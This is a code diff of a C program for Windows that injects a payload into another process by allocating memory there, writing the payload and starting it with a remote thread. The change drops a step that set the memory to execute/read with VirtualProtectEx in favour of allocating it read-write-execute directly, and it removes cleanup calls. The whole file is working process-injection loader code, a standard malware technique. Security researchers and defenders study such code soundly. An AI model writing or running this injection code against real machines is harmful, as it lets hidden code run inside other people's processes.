@@ -86,49 +86,32 @@ int main(int argc, char *argv[])
         return -1;
     }
 
-    // 2. Allocate memory as READ/WRITE first
-    rb = VirtualAllocEx(
-        ph,
-        NULL,
-        payload_len,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE);
-
+    // 2. Allocate memory
+    rb = VirtualAllocEx(ph, NULL, payload_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
     if (rb == NULL)
     {
-        printf("[-] VirtualAllocEx failed. Error: %lu\n", GetLastError());
+        printf("[-] VirtualAllocEx failed. Error: %d\n", GetLastError());
         CloseHandle(ph);
         return -1;
     }
-
     printf("[+] Memory allocated at: 0x%p\n", rb);
 
     // 3. Write memory
     if (!WriteProcessMemory(ph, rb, payload, payload_len, NULL))
     {
-        printf("[-] WriteProcessMemory failed. Error: %lu\n", GetLastError());
-        VirtualFreeEx(ph, rb, 0, MEM_RELEASE);
+        printf("[-] WriteProcessMemory failed. Error: %d\n", GetLastError());
         CloseHandle(ph);
         return -1;
     }
 
-    printf("[+] Payload written to remote process memory\n");
-
-    // 4. Change memory protection to EXECUTE/READ
-    DWORD oldProtect = 0;
-
-    if (!VirtualProtectEx(ph, rb, payload_len, PAGE_EXECUTE_READ, &oldProtect))
-    {
-        printf("[-] VirtualProtectEx failed. Error: %lu\n", GetLastError());
-        VirtualFreeEx(ph, rb, 0, MEM_RELEASE);
-        CloseHandle(ph);
-        return -1;
-    }
-
-    printf("[+] Memory protection changed from 0x%lx to PAGE_EXECUTE_READ\n", oldProtect);
-
-    // 5. Create Remote Thread
+    // 4. Create Remote Thread
     th = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
+    if (th == NULL)
+    {
+        printf("[-] CreateRemoteThread failed. Error: %d\n", GetLastError());
+        CloseHandle(ph);
+        return -1;
+    }
 
     printf("[+] Success! Remote thread created (TID: %d)\n", GetThreadId(th));
 
